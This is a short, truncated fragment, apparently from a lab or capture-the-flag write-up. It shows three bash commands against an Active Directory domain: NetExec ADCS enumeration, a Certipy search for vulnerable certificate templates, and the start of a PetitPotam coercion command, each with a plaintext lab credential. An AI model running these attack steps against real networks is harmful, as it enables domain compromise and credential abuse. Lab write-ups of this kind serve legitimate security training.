...
```bash
nxc ldap 172.16.90.60 -u clare.frost -p 'atnTYzyew3Ok+d' -d kaiju.vl -M adcs
```
...
```bash
certipy find -u clare.frost -p 'atnTYzyew3Ok+d' -dc-ip 172.16.90.60 -vulnerable -stdout
```
...
```bash
python3 PetitPotam.py -u 'Clare.Frost' -p 'atnTYzyew3Ok+d' \
